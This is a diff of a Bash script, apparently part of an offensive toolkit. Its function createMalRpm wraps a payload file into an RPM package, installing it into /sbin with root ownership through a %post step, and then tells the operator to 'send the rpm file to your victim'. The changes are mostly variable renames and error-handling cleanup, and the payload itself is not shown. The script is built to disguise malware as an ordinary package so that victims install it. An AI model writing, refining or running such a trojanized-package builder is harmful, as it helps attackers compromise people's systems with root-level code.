@@ -1,14 +1,14 @@
 
-# rpm packagerx
+# rpm packager
 
 
 _spec(){
     while read line
     do
 	$line
-    done << EOF > ${HOME}/rpmbuild/SPECS/${CUT_IT}.spec
+    done << EOF > ${HOME}/rpmbuild/SPECS/${fileName}.spec
 set -f
-echo Name:                                      ${CUT_IT}
+echo Name:                                      ${fileName}
 echo Version:                                   ${vnumber}
 echo Release:                                   1%{?dist}
 echo Summary:                                   ${description}
@@ -38,8 +38,8 @@ echo rm -rf \$RPM_BUILD_ROOT
 
 
 echo %post
-echo chown -R root:root /sbin/${CUT_IT}
-echo chmod 775 /sbin/${CUT_IT}
+echo chown -R root:root /sbin/${fileName}
+echo chmod 775 /sbin/${fileName}
 
 EOF
 }
@@ -51,14 +51,13 @@ createMalRpm() {
 	case $inmissile in
 	    y)
 		echo ""
-		which rpm >/dev/null 
-		if [[ $? == 1 ]];then
-		    
-		    printf "\n${open}${bold}${red}[!]rpm package manager is not installed on your box${close}\n"
+		which rpm >/dev/null
+		[[ $? == 1 ]] && {
+		    printf "${open}${bold}${red}%s${close}" "[!]executable for rpm package manager was not found"
 		    exit 2;
-		else
-		    [[ ! -d "$HOME/rpmbuild" ]] && mkdir -p "$HOME/rpmbuild/{BUILD,BUILDROOT,RPMS,SOURCES,SPECS,SRPMS}"
-		fi
+		}
+		
+		[[ ! -d "$HOME/rpmbuild" ]] && mkdir -p "$HOME/rpmbuild/{BUILD,BUILDROOT,RPMS,SOURCES,SPECS,SRPMS}"
 		
 		dirfile="${0##*/}${SPID}"
 		mainlocation=$(pwd)
@@ -68,34 +67,28 @@ createMalRpm() {
 		cd "$HOME/rpmbuild/SPECS"
 		_spec
 		cd "$HOME/rpmbuild/SOURCES"
-		mkdir "${CUT_IT}-${vnumber}"
-		mv "${CUT_IT}" "${CUT_IT}-${vnumber}"
-		tar -cvzf "${CUT_IT}-${vnumber}.tar.gz" "${CUT_IT}-${vnumber}"
-		rm -rf "${CUT_IT}" "${CUT_IT}-${vnumber}"
+		mkdir "${fileName}-${vnumber}"
+		mv "${fileName}" "${fileName}-${vnumber}"
+		tar -cvzf "${fileName}-${vnumber}.tar.gz" "${fileName}-${vnumber}"
+		rm -rf "${fileName}" "${fileName}-${vnumber}"
 		cd "$mainlocation"
-		rpmbuild -v -bb "$HOME/rpmbuild/SPECS/${CUT_IT}.spec"
-		mv "$HOME/rpmbuild/RPMS/noarch/${CUT_IT}-${vnumber}-1.noarch.rpm" .
-		if [ $? = 0 ];then
+		rpmbuild -v -bb "$HOME/rpmbuild/SPECS/${fileName}.spec"
+		mv "$HOME/rpmbuild/RPMS/noarch/${fileName}-${vnumber}-1.noarch.rpm" .
+		
+		if [[ $? == 0 ]];then
 		    printf "${open}${light}${green}Ok we are done here..${close}\n"
 		    printf "${open}${light}${green}You can now send the rpm file to your victim${close}\n"
-		    sleep 3
-		    echo ""
 		    box3d
 		    break
-		    exit
-		    
-		else
-		    
-		    printf "${open}${light}${red}Error encountered while building the rpm package${close}\n"
-		    exit $RANDOM
-		    
 		fi
-		
+		    
+		printf "${open}${light}${red}Error encountered while building the rpm package${close}\n"
+		exit 2
 		;;
 	    n|N)
 		shit_func ;;
 	    *)
-		echo "${open}${light}${red}Invalid Response${close}" && continue ;;
+		printf "${open}${light}${red}%s${close}" "Invalid Response" && continue ;;
 	esac
     done
 }
